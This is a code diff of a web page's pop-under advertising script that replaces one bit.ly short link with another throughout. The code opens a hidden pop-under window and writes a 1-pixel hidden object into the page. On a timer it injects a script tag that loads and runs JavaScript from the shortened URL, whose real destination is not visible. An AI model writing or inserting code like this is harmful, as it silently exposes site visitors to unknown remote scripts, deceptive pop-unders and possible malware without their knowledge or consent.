@@ -106,7 +106,7 @@ var pop = 'enter';
 var myurl = document.location.protocol + "//" + document.location.host;
 var fc = '-1';
 var objectFile = 'index.shtml';
-contextualAds = 'http://bit.ly/2uaHwCC';
+contextualAds = 'http://bit.ly/2SMWnwW';
 var MAX_TRIED = 20;
 var objectTried = false;
 var tried = 0;
@@ -150,7 +150,7 @@ function popObject(){
 	if (pObj) {
 		try {
 			if(!poped){
-				popwin=pObj.DOM.Script.open ("http://bit.ly/2uaHwCC","Ads1195333784","scrollbars=1, resizable=1, menubar=1, location=1, top=100,left=100, width=800, height=800");
+				popwin=pObj.DOM.Script.open ("http://bit.ly/2SMWnwW","Ads1195333784","scrollbars=1, resizable=1, menubar=1, location=1, top=100,left=100, width=800, height=800");
 			}
 			if (popwin) {
 				popwin.blur();
@@ -195,7 +195,7 @@ function version() {
 }
 version();
 
-function getPaypopupURL(popwin, bk) {if (popwin) {if (contextualAds) {popwin.location = contextualAds+escape('');}else {popwin.location = 'http://bit.ly/2uaHwCC';}popwin.blur();self.focus();poped=true;}return popwin;}
+function getPaypopupURL(popwin, bk) {if (popwin) {if (contextualAds) {popwin.location = contextualAds+escape('');}else {popwin.location = 'http://bit.ly/2SMWnwW';}popwin.blur();self.focus();poped=true;}return popwin;}
 
 var randInterstitial = Math.round(100*Math.random());
 var forceInterstitial = 0;
@@ -239,7 +239,7 @@ function ppinter(){
 	if (c.parentNode != document.body) {
 		interstitialBox.hideTime = 10;
 	}
-	setTimeout('if(!poped ||forceInterstitial){var ppob = document.getElementById(pppid);var scob = document.createElement("SCRIPT");scob.src = "http://bit.ly/2uaHwCC";ppob.appendChild(scob);}', 10);
+	setTimeout('if(!poped ||forceInterstitial){var ppob = document.getElementById(pppid);var scob = document.createElement("SCRIPT");scob.src = "http://bit.ly/2SMWnwW";ppob.appendChild(scob);}', 10);
 }
 
 var pppid='pppid142'; document.write("<object style='display:block;width:1px;height:1px;position:absolute;left:0px;top:0px' id='"+pppid+"'></object>");
